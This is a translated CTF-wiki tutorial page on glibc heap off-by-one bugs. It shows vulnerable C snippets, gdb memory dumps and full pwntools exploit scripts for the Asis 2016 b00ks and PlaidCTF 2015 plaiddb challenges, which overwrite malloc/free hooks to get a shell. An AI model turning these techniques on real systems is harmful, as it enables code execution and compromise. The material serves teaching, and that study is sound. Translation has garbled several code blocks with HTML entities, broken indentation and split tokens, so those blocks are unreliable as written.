[EN](./off_by_one.md) | [ZH](./off_by_one-zh.md)
#Off-By-One in the heap


## Introduction


Strictly speaking, the off-by-one vulnerability is a special type of overflow vulnerability. Off-by-one means that when a program writes to a buffer, the number of bytes written exceeds the number of bytes requested by the buffer itself. And only one byte is crossed.


## off-by-one Vulnerability Principle


Off-by-one refers to a single-byte buffer overflow. This vulnerability is often related to the lack of strict boundary verification and string operations. Of course, it does not rule out that the size of the write is just one byte more. Where the boundary verification is not strict, usually includes


- When writing data to a heap block using a loop statement, the number of loops set incorrectly (which is common in C language beginners) results in more than one byte being written.
- String operation is not appropriate


In general, single-byte overflows are considered to be difficult to exploit, but because of the looseness of Linux&#39;s heap management mechanism ptmalloc validation, Linux-based off-by-one exploits are not complex and powerful.
In addition, the point to note is that off-by-one can be based on various buffers, such as stacks, bss segments, etc., but the heap-based off-by-one is more common in CTFs. We will only discuss the off-by-one situation on the heap here.


## off-by-one Use ideas


1. The overflow byte is any byte that can be controlled: by modifying the size, there is overlap between the block structures, thereby leaking other block data or overwriting other block data. You can also use the NULL byte overflow method.
2. The overflow byte is NULL. When the size is 0x100, overflowing the NULL byte makes the `prev_in_use` bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing. (2) In addition, when the `prev_size` field is enabled, you can forge `prev_size`, causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by `prev_size` (theoretically the block currently unlinked) is equal to the block size currently being unlinked.


In the latest version of the code, the check for the latter method in 2 has been added, but the check was not available before 2.28.


```

/* consolidate backward */

    if (!prev_inuse(p)) {

      prevsize = prev_size (p);

      size += prevsize;

      p = chunk_at_offset(p, -((long) prevsize));

/* The last two lines of code are added in the latest version, then the second method of 2 is not available, but there is no problem in 2.28 and before*/
      if (__glibc_unlikely (chunksize(p) != prevsize))

        malloc_printerr ("corrupted size vs. prev_size while consolidating");

unlink_chunk (av, p);
    }



```



### Example 1


```

int my_gets(char *ptr,int size)

{

    int i;

    for(i=0;i<=size;i++)

    {

        ptr[i]=getchar();

    }

    return i;

}

int main()

{

    void *chunk1,*chunk2;

    chunk1=malloc(16);

    chunk2=malloc(16);

    puts("Get Input:");

    my_gets(chunk1,16);

    return 0;

}

```



Our own my_gets function caused an off-by-one vulnerability because the boundaries of the for loop were not controlled enough to cause writes to be executed once, which is also called a fence error.


> wikipedia:

&gt; Fence errors (sometimes called pole errors or lamppost errors) are a type of error. Such as the following questions:
>

&gt; Build a straight fence (ie no circle), 30 meters long, 3 meters apart between each fence column, how many fence posts do you need?
>

&gt; The easiest answer 10 is wrong. This fence has 10 intervals and 11 fence posts.


We use gdb to debug the program. Before inputting, we can see that the two allocated user areas are 16-byte heap blocks.
```

0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1

0x602010:	0x0000000000000000	0x0000000000000000

0x602020:	0x0000000000000000	0x0000000000000021 <=== chunk2

0x602030:	0x0000000000000000	0x0000000000000000

```

When we execute my_gets for input, we can see that the data has overflowed to cover the prev_size field of the next heap.
print 'A'*17

```

0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1

0x602010:	0x4141414141414141	0x4141414141414141

0x602020:	0x0000000000000041	0x0000000000000021 <=== chunk2

0x602030:	0x0000000000000000	0x0000000000000000

```



### Example 2


The second common scenario that causes off-by-one is string manipulation. The common reason is that the end of the string is incorrectly calculated.


```

int main(void)

{

    char buffer[40]="";

    void *chunk1;

    chunk1=malloc(24);

    puts("Get Input");

    gets(buffer);

    if(strlen(buffer)==24)

    {

        strcpy(chunk1,buffer);

    }

    return 0;



}

```



At first glance, the program doesn&#39;t seem to have any problems (regardless of stack overflow), and many people may write it in the actual code as well.
However, the behavior of strlen and strcpy is inconsistent, which leads to the occurrence of off-by-one.
Strlen is a function we are familiar with calculating the length of an ascii string. This function does not count the terminator `&#39;\x00&#39;` when calculating the length of a string, but strcpy copies the terminator when copying a string. &#39;\x00&#39;`. This caused us to write 25 bytes to chunk1, which we can see with gdb debugging.


```

0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1

0x602010:	0x0000000000000000	0x0000000000000000

0x602020:	0x0000000000000000	0x0000000000000411 <=== next chunk

```



Execute strcpy after we type &#39;A&#39;*24


```

0x602000:	0x0000000000000000	0x0000000000000021

0x602010:	0x4141414141414141	0x4141414141414141

0x602020:	0x4141414141414141	0x0000000000000400

```



You can see that the low byte of the size field of the next chunk is overwritten by the terminator `&#39;\x00&#39;`. This branch of the off-by-one is called NULL byte off-by-one, which we will see later. The difference between off-by-one and NULL byte off-by-one.
There is still one thing why the low byte is overwritten, because the byte order of the CPU we usually use is small endian, such as a DWORD value stored in the memory using the little endian method.

```

DWORD 0x41424344

Memory 0x44, 0x43, 0x42, 0x41
```



## 实例 1: Asis CTF 2016 [b00ks](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks)





### Title introduction




The topic is a common menu-style program that features a library management system.


```

1. Create a book

2. Delete a book

3. Edit a book

4. Print book detail

5. Change current author name

6. Exit

```



The program provides the ability to create, delete, edit, and print books. The title is a 64-bit program and the protection is as follows.


```

Canary                        : No

NX                            : Yes

PIE                           : Yes

Fortify                       : No

RelRO                         : Full

```



Each time a program creates a program, it allocates a 0x20 byte structure to maintain its information.


```

struct book

{

    int id;

    char *name;

    char *description;

    int size;

}

```



### create



Name and description exist in the book structure, and name and description are allocated on the heap. First allocate the name buffer, use malloc, the size is custom but less than 32.


```

printf("\nEnter book name size: ", *(_QWORD *)&size);

__isoc99_scanf("%d", &size);

printf("Enter book name (Max 32 chars): ", &size);

ptr = malloc(size);

```



The description is then assigned, the same size is customizable but unlimited.


```

printf("\nEnter book description size: ", *(_QWORD *)&size);

        __isoc99_scanf("%d", &size);



v5 = malloc(size);

```



After allocating the memory of the book structure


```

book = malloc(0x20uLL);

if ( book )

{

    *((_DWORD *)book + 6) = size;

    *((_QWORD *)off_202010 + v2) = book;

    *((_QWORD *)book + 2) = description;

    *((_QWORD *)book + 1) = name;

    *(_DWORD *)book = ++unk_202024;

    return 0LL;

}

```



### Vulnerability


There is a null byte off-by-one vulnerability in the read function of the program. If you look closely at the read function, you can find that the consideration of the boundary is not appropriate.


```

signed __int64 __fastcall my_read(_BYTE *ptr, int number)

{

  int i; // [rsp+14h] [rbp-Ch]

  _BYTE *buf; // [rsp+18h] [rbp-8h]



  if ( number <= 0 )

    return 0LL;

buf = ptr;
  for ( i = 0; ; ++i )

  {

    if ( (unsigned int)read(0, buf, 1uLL) != 1 )

      return 1LL;

    if ( *buf == '\n' )

      break;

++ buf;
    if ( i == number )

      break;

  }

* buf = 0;
  return 0LL;

}

```



### Use


#### Leak




Because the my_read function in the program has a null byte off-by-one , in fact the terminator &#39;\x00&#39; read by my_read is written to 0x555555756060. This will overwrite the terminator &#39;\x00&#39; when 0x555555756060~0x555555756068 is written to the book pointer, so there is a vulnerability in the address leak. The value of the first item in the pointer array can be obtained by printing the author name.


```

0x555555756040:	0x6161616161616161	0x6161616161616161

0x555555756050:	0x6161616161616161	0x6161616161616161   <== author name

0x555555756060:	0x0000555555757480 <== pointer array	0x0000000000000000

0x555555756070:	0x0000000000000000	0x0000000000000000

0x555555756080:	0x0000000000000000	0x0000000000000000

```



In order to achieve the leak, first enter 32 bytes in the author name to make the terminator overwritten. After that we create book1, the pointer of book1 will overwrite the last NULL byte in author name, so that the pointer is directly connected with author name, so that the output author name can get a heap pointer.


```

io.recvuntil('Enter author name:') # input author name

io.sendline (&#39;a&#39; * 32)

io.recvuntil (&#39;&gt;&#39;) # create book1
io.sendline ( &#39;1&#39;)
io.recvuntil('Enter book name size:')

io.sendline (&#39;32 &#39;)
io.recvuntil('Enter book name (Max 32 chars):')

io.sendline('object1')

io.recvuntil('Enter book description size:')

io.sendline (&#39;32 &#39;)
io.recvuntil('Enter book description:')

io.sendline('object1')



io.recvuntil (&#39;&gt;&#39;) # print book1
io.sendline ( &#39;4&#39;)
io.recvuntil ( &#39;Author:&#39;)
io.recvuntil (&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;) # &lt;== leak book1
book1_addr = io.recv (6)
book1_addr = book1_addr.ljust (8, &#39;x00&#39;)
book1_addr = u64(book1_addr)

```





#### off-by-one Override pointer low byte


The change function is also provided in the program. The change function is used to modify the author name, so the change can be used to write the author name, and the off-by-one is used to override the low byte of the first item of the pointer array.




After overwriting the low byte of the book1 pointer, this pointer points to the description of book1. Since the program provides the edit function, the content in the description can be arbitrarily modified. We can pre-define the data in the description to create a book structure. The description and name pointers of this book structure can be directly controlled.


```

def off_by_one(addr):

    addr += 58

    io.recvuntil('>')# create fake book in description

io.sendline ( &#39;3&#39;)
    fake_book_data = p64(0x1) + p64(addr) + p64(addr) + pack(0xffff)

    io.recvuntil('Enter new book description:')

    io.sendline(fake_book_data) # <== fake book





    io.recvuntil('>') # change author name

io.sendline ( &#39;5&#39;)
    io.recvuntil('Enter author name:')

    io.sendline('a' * 32) # <== off-by-one

```



Here, the book is forged in the description, and the data used is p64(0x1)+p64(addr)+p64(addr)+pack(0xffff).
Where addr+58 is to point the pointer to the pointer address of book2, so that we can modify these pointer values arbitrarily.




#### Using the stack to achieve utilization


Through the previous two parts, we have obtained the ability to read and write at any address. The reader may find that the following operations are obvious, such as writing the get table hijacking process or writing the __malloc_hook hijacking process. But the special thing about this topic is that PIE is turned on and there is no way to leak the libc base address, so we need to think about other methods.


The clever thing about this is that when you allocate a second book, use a large size to make the heap expand in mmap mode. We know that there are two ways to expand the heap. One is that brk will directly expand the original heap, and the other is that mmap will map a piece of memory separately.


Here we apply for an oversized block to extend memory using mmap. Because the memory allocated by mmap has a fixed offset from libc, the base address of libc can be derived.
```

Start              End                Offset             Perm Path

0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123
0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw-

0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- <=== mmap

0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw-

0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]

0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]

0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]

0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]

```



```

Start              End                Offset             Perm Path

0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/ Desktop/123/123
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/ Desktop/123/123
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/ Desktop/123/123
0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so

0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw-

0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- <=== mmap

0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so

0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw-

0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]

0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]

0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]

0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]

```



#### exploit



```python

from pwn import *

context.log_level="info"



binary = ELF("b00ks")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io = process (&quot;./ b00ks&quot;)




def createbook(name_size, name, des_size, des):

io.readuntil (&quot;&gt;&quot;)
io.sendline ( &quot;1&quot;)
io.readuntil (&quot;:&quot;)
	io.sendline(str(name_size))

io.readuntil (&quot;:&quot;)
	io.sendline(name)

io.readuntil (&quot;:&quot;)
	io.sendline(str(des_size))

io.readuntil (&quot;:&quot;)
io.sendline (des)


def printbook(id):

io.readuntil (&quot;&gt;&quot;)
io.sendline ( &quot;4&quot;)
io.readuntil (&quot;:&quot;)
	for i in range(id):

		book_id = int(io.readline()[:-1])
io.readuntil (&quot;:&quot;)
		book_name = io.readline()[:-1]

io.readuntil (&quot;:&quot;)
book_des = io.readline () [: - 1]
io.readuntil (&quot;:&quot;)
		book_author = io.readline()[:-1]

	return book_id, book_name, book_des, book_author



def createname(name):

io.readuntil (&quot;name:&quot;)
	io.sendline(name)



def changename(name):

io.readuntil (&quot;&gt;&quot;)
io.sendline ( &quot;5&quot;)
io.readuntil (&quot;:&quot;)
	io.sendline(name)



def editbook(book_id, new_des):

io.readuntil (&quot;&gt;&quot;)
io.sendline ( &quot;3&quot;)
io.readuntil (&quot;:&quot;)
	io.writeline(str(book_id))

io.readuntil (&quot;:&quot;)
	io.sendline(new_des)



def deletebook(book_id):

io.readuntil (&quot;&gt;&quot;)
io.sendline ( &quot;2&quot;)
io.readuntil (&quot;:&quot;)
	io.sendline(str(book_id))



createname("A" * 32)

createbook(128, "a", 32, "a")

createbook(0x21000, "a", 0x21000, "b")





book_id_1, book_name, book_des, book_author = printbook(1)

book1_addr = u64(book_author[32:32+6].ljust(8,'\x00'))

log.success("book1_address:" + hex(book1_addr))



payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)

editbook(book_id_1, payload)

changename("A" * 32)



book_id_1, book_name, book_des, book_author = printbook(1)

book2_name_addr = u64(book_name.ljust(8,"\x00"))

book2_des_addr = u64 (book_des.ljust (8, &quot;x00&quot;))
log.success("book2 name addr:" + hex(book2_name_addr))

log.success("book2 des addr:" + hex(book2_des_addr))

libc_base = book2_des_addr - 0x5b9010

log.success("libc base:" + hex(libc_base))



free_hook = libc_base + libc.symbols["__free_hook"]

one_gadget = libc_base + 0x4f322 # 0x4f2c5 0x10a38c 0x4f322

log.success("free_hook:" + hex(free_hook))

log.success("one_gadget:" + hex(one_gadget))

editbook(1, p64(free_hook) * 2)

editbook(2, p64(one_gadget))



deletebook(2)



io.interactive ()
```



#### Simple plan


After any read and write, another way to find libc is to first cause the libc address to be written on the heap before any read and write, and then read it out by any read.


In order to find the offset where libc is located, you can debug directly through gdb to view the location of the specific libc address on the heap, without deliberate calculation.


Exp is as follows:


```

#! /usr/bin/env python2

# -*- coding: utf-8 -*-

# vim: hay = utf-8


import sys

import
import os.path

from pwn import *

context(os='linux', arch='amd64', log_level='debug')



if len(sys.argv) > 2:

    DEBUG = 0

    HOST = sys.argv[1]

    PORT = int(sys.argv[2])



    p = remote(HOST, PORT)

else:

    DEBUG = 1

    if len(sys.argv) == 2:

        PATH = sys.argv[1]



    p = process(PATH)



def cmd(choice):

    p.recvuntil('> ')

    p.sendline(str(choice))





def create(book_size, book_name, desc_size, desc):

    cmd(1)

    p.recvuntil(': ')

    p.sendline(str(book_size))

    p.recvuntil(': ')

    if len(book_name) == book_size:

        p.send(book_name)

    else:

        p.sendline(book_name)

    p.recvuntil(': ')

    p.sendline(str(desc_size))

    p.recvuntil(': ')

    if len(desc) == desc_size:

        p.send(desc)

    else:

        p.sendline(desc)





def remove(idx):

    cmd(2)

    p.recvuntil(': ')

    p.sendline(str(idx))





def edit(idx, desc):
    cmd(3)

    p.recvuntil(': ')

    p.sendline(str(idx))

    p.recvuntil(': ')

    p.send(desc)





def author_name(author):

    cmd(5)

    p.recvuntil(': ')

    p.send(author)





libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')



def main():

    # Your exploit script goes here



    # leak heap address

    p.recvuntil('name: ')

    p.sendline('x' * (0x20 - 5) + 'leak:')



    create(0x20, 'tmp a', 0x20, 'b') # 1

    cmd(4)

    p.recvuntil('Author: ')

    p.recvuntil('leak:')

    heap_leak = u64(p.recvline().strip().ljust(8, '\x00'))

    p.info('heap leak @ 0x%x' % heap_leak)

    heap_base = heap_leak - 0x1080



    create(0x20, 'buf 1', 0x20, 'desc buf') # 2

    create(0x20, 'buf 2', 0x20, 'desc buf 2') # 3

    remove(2)

    remove(3)



ptr = heap_base + 0x1180
payload = p64 (0) + p64 (0x101) + p64 (ptr - 0x18) + p64 (ptr - 0x10) + &#39;\ x00&#39;
    create(0x20, 'name', 0x108, 'overflow') # 4

    create(0x20, 'name', 0x100 - 0x10, 'target') # 5

    create(0x20, '/bin/sh\x00', 0x200, 'to arbitrary read write') # 6



    edit(4, payload) # overflow

    remove(5) # unlink



    edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\n')



    def write_to(addr, content, size):

        edit(4, p64(addr) + p64(size + 0x100) + '\n')

        edit(6, content + '\n')



    def read_at(addr):

        edit(4, p64(addr) + '\n')

        cmd(4)

        p.recvuntil('Description: ')

        p.recvuntil('Description: ')

        p.recvuntil('Description: ')

        content = p.recvline()[:-1]

        p.info(content)

        return content



    libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\x00')) - 0x3c4b78

    p.info('libc leak @ 0x%x' % libc_leak)



    write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10)

    remove(6)



    p.interactive()



if __name__ == '__main__':

    main()

```



## Instance 2 : plaidctf 2015 plaiddb


```shell

➜  2015_plaidctf_datastore git:(master) file datastore

datastore: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=1a031710225e93b0b5985477c73653846c352add, stripped

➜  2015_plaidctf_datastore git:(master) checksec datastore

[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore'

    Arch:     amd64-64-little

    RELRO:    Full RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      PIE enabled

    FORTIFY:  Enabled

➜  2015_plaidctf_datastore git:(master)

```



As you can see, the program is 64-bit dynamically linked. The protection is all turned on.


### Functional Analysis


Key data structure:


```

struct Node {

char * key;
    long data_size;

    char *data;

    struct Node *left;

    struct Node *right;

    long dummy;

    long dummy1;

}

```



The structure of the binary tree is mainly used to store data, and the specific storage process does not affect the utilization.


The function function needs to pay attention to `getline` (self-implemented single-line read function):


```

char *__fastcall getline(__int64 a1, __int64 a2)

{

  char *v2; // r12

char * v3; // rbx
  size_t v4; // r14

char v5; // al
char v6; // bp
  signed __int64 v7; // r13

  char *v8; // rax



V2 = (char *)malloc(8uLL); // Initially use malloc(8) for allocation
v3 = v2;
V4 = malloc_usable_size(v2); // Calculated the available size, for example, for malloc(8), this should be 24
  while ( 1 )

  {

    v5 = _IO_getc(stdin);
v6 = v5;
    if ( v5 == -1 )

      bye();

    if ( v5 == 10 )

      break;

v7 = v3 - v2;
    if ( v4 <= v3 - v2 )

    {

V8 = (char *)realloc(v2, 2 * v4); // The size is not enough to multiply the available size by two for realloc
      v2 = v8;

      if ( !v8 )

      {

        puts("FATAL: Out of memory");

        exit(-1);

      }

v3 = &amp; v8 [v7];
      v4 = malloc_usable_size(v8);

    }

*v3++ = v6; // &lt;--- The vulnerability is where v3 is indexed and points to the next location. If the location is all used, it will point to the next non-writeable location.
  }

*v3 = 0; // &lt;--- The vulnerability is located. Off by one (NULL byte overflow)
  return v2;

}

```



Several main features:


```

unsigned __int64 main_fn()

{

  char v1[8]; // [rsp+0h] [rbp-18h]

  unsigned __int64 v2; // [rsp+8h] [rbp-10h]



  v2 = __readfsqword(0x28u);

  puts("PROMPT: Enter command:");

  gets_checked(v1, 8LL);

  if ( !strcmp(v1, "GET\n") )

  {

    cmd_get();

  }

  else if ( !strcmp(v1, "PUT\n") )

  {

    cmd_put();

  }

  else if ( !strcmp(v1, "DUMP\n") )

  {

    cmd_dump();

  }

  else if ( !strcmp(v1, "DEL\n") )

  {

    cmd_del();

  }

  else

  {

    if ( !strcmp(v1, "EXIT\n") )

      bye();

    __printf_chk(1LL, "ERROR: '%s' is not a valid command.\n", v1);

  }

  return __readfsqword(0x28u) ^ v2;

}

```



Both `dump` and `get` are used to read the content, so `key` and specific data content can be read, and less attention is needed. Focus on `put` and `del`:


```

__int64 __fastcall cmd_put()

{

__int64 v0; // rsi
  Node *row; // rbx

  unsigned __int64 sz; // rax

char * v3; // rax
__int64 v4; // rbp
  __int64 result; // rax

  __int64 v6; // [rsp+0h] [rbp-38h]

  unsigned __int64 v7; // [rsp+18h] [rbp-20h]



  v7 = __readfsqword(0x28u);

  row = (Node *)malloc(0x38uLL);

  if ( !row )

  {

    puts("FATAL: Can't allocate a row");

    exit(-1);

  }

  puts("PROMPT: Enter row key:");

  row->key = getline((__int64)"PROMPT: Enter row key:", v0);

  puts("PROMPT: Enter data size:");

  gets_checked((char *)&v6, 16LL);

  sz = strtoul((const char *)&v6, 0LL, 0);

  row->data_size = sz;

  v3 = (char *)malloc(sz);

  row->data = v3;

  if ( v3 )

  {

    puts("PROMPT: Enter data:");

    fread_checked(row->data, row->data_size);

    v4 = insert_node(row);

    if ( v4 )

    {

      free(row->key);

      free(*(void **)(v4 + 16));

      *(_QWORD *)(v4 + 8) = row->data_size;

      *(_QWORD *)(v4 + 16) = row->data;

      free(row);

      puts("INFO: Update successful.");

    }

    else

    {

      puts("INFO: Insert successful.");

    }

    result = __readfsqword(0x28u) ^ v7;

  }

  else

  {

    puts("ERROR: Can't store that much data.");

    free(row->key);

    free(row);

  }

  return result;

}

```



The distribution process is:


Malloc (0x38) (structure)
2. getline (malloc 和 realloc)

3. malloc (size) controllable size
4. Read the size byte content

The more complicated part we can see later will be used, that is, the part about `free` used in put


For deletion, this function is more complicated and will not be explained in detail. In fact, you only need to know that he is deleted according to the key, and the key is read using `getline`. If there is no such key, the part of `getline` will not be deleted. If any, then `free`


### Exploit Analysis


The location of the vulnerability has been pointed out in the functional analysis, in `getline`, but the special feature of this function is that its allocated size is gradually increasing, by increasing the available size by two, using `realloc`, that is, if we want to trigger this vulnerability, we need to meet certain size requirements.


According to the allocation process, the size of the satisfaction is:


* 0x18

* 0x38

* 0x78

* 0xf8

* 0x1f8

* ...



These sizes can trigger an overflow.


Now we need to know the specific methods we need to adopt. First, the `off-by-one` vulnerability can cause heap crossover, which can cause the libc address to leak. Afterwards, the utilization method to be used, because there is already a heap crossover, that is, a UAF can be formed, and the UAF common method can be used.


The easiest way to get a UAF vulnerability is of course fastbin attack, so I used fastbin attack.


Here, we can begin to think about how to form the conditions of use we need. The final effect of `off-by-one` is that you can release a smallbin chunk or unsortedbin chunk of a released state until it is merged into a large chunk by the overflow chunk. That is:


```

+------------+

| | &lt;-- free unsortedbin or smallbin chunk (because fd and bk point to legal pointers at this time, unlink can be done)
+------------+

| ... | &lt;-- arbitrary chunk
+------------+

| | &lt;-- Chunk for overflow
+------------+

| vuln | &lt;-- The chunk that was overflowed, the size is 0x_00 (eg 0x100, 0x200...)
+------------+

```



After the use of `off-by-one`, the chunks that appear above will be merged into a freed chunk. If the position of any intermediate chunk is already allocated, it can cause overlap.


According to our utilization ideas, combined with the topic `getline` function through `malloc(8)` and then `realloc`, we need to:


1. At least one chunk of any chunk location has been allocated, and the chunk of data can be read to leak the libc address.
2. The chunk that overflows needs to be allocated before the top chunk, otherwise `malloc(8)` will be allocated to the top instead of where the chunk should be.
3. Any chunk location needs at least one chunk that has been released and has a size of 0x71 for fastbin attack
4. All chunks should not be merged into top, so there should be an already allocated chunk at the bottom to guarantee the distance from the top chunk.
5. The size of the chunk that overflows should belong to unsortedbin or smallbin. It cannot be fastbin. Otherwise, after being released, according to the allocation method of `getline`, `malloc(8)` cannot be allocated at this location.


According to the above principles, we can think about the distribution of chunks as follows:


```

+------------+

|      1     |  <-- free 的 size == 0x200 chunk

+------------+

| 2 | &lt;-- size == 0x60 fastbin chunk, has been allocated, and can read data
+------------+

| 5 | &lt;-- size == 0x71 fastbin chunk, ready for fastbin attack
+------------+

|      3     |  <-- size == 0x1f8 free 状态的 smallbin/unsortedbin chunk

+------------+

| 4 | &lt;-- size == 0x101 is overflowed chunk
+------------+

| X | &lt;-- arbitrarily allocated chunks prevent top merge
+------------+

```



Since the allocation process has some additional structure (the allocation of the structure itself and `getline`), we need to release enough fastbin chunks to avoid the allocation of the structure itself affecting our process.


After that, release 5, 3, 1, and then use `delline` when `del` is input, fill 3, causing `off-by-one`, then merge 4 `free` to merge (forgery `prev_size`), so there is a cross heap structure.


The process is much simpler. First allocate the size of 1 so that the libc address is written to 2, you can leak the address, then allocate 5 and write the required content, you can fastbin attack.


### exploit



Since the original libc is 2.19 version, loading some strange problems is more troublesome, and this problem does not use the unique features of 2.19, so I used the 2.23 libc for debugging, the version is ubuntu10.



```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8

import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')

if len(sys.argv) > 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]

    p = process(PATH)


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # ubuntu 16.04

def cmd(command_num):
    p.recvuntil('command:')
    p.sendline(str(command_num))


def put(key, size, data):
    cmd('PUT')
    p.recvuntil('key:')
    p.sendline(key)

    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('data:')
    if len(data) < size:
        p.send(data.ljust(size, '\x00'))
    else:
        p.send(data)


def delete(key):
    cmd('DEL')
    p.recvuntil('key:')
    p.sendline(key)


def get(key):
    cmd('GET')
    p.recvuntil('key:')
    p.sendline(key)
    p.recvuntil('[')
    num = int(p.recvuntil(' bytes').strip(' bytes'))
    p.recvuntil(':\n')
    return p.recv(num)


def main():
    # avoid complicity of structure malloc
    for i in range(10):
        put(str(i), 0x38, str(i))
        
    for i in range(10):
        delete(str(i))

    # allocate what we want in order
    put('1', 0x200, '1')
    put('2', 0x50, '2')
    put('5', 0x68, '6')
    put('3', 0x1f8, '3')
    put('4', 0xf0, '4')
    put('defense', 0x400, 'defense-data')


    # free those need to be freed
    delete('5')
    delete('3')
    delete('1')

    delete('a' * 0x1f0 + p64(0x4e0))

    delete('4')

    put('0x200', 0x200, 'fillup')
    put('0x200 fillup', 0x200, 'fillup again')

    libc_leak = u64(get('2')[:6].ljust(8, '\x00'))
    p.info('libc leak: 0x%x' % libc_leak)
    
    libc_base = libc_leak - 0x3c4b78

    p.info('libc_base: 0x%x' % libc_base)

    put('fastatk', 0x100, 'a' * 0x58 + p64(0x71) + p64(libc_base + libc.symbols['__malloc_hook'] - 0x10 + 5 - 8))
    put('prepare', 0x68, 'prepare data')

    one_gadget = libc_base + 0x4526a
    put('attack', 0x68, 'a' * 3 + p64(one_gadget))

    p.sendline('DEL') # malloc(8) triggers one_gadget

    p.interactive()

if __name__ == '__main__':
    main()
```

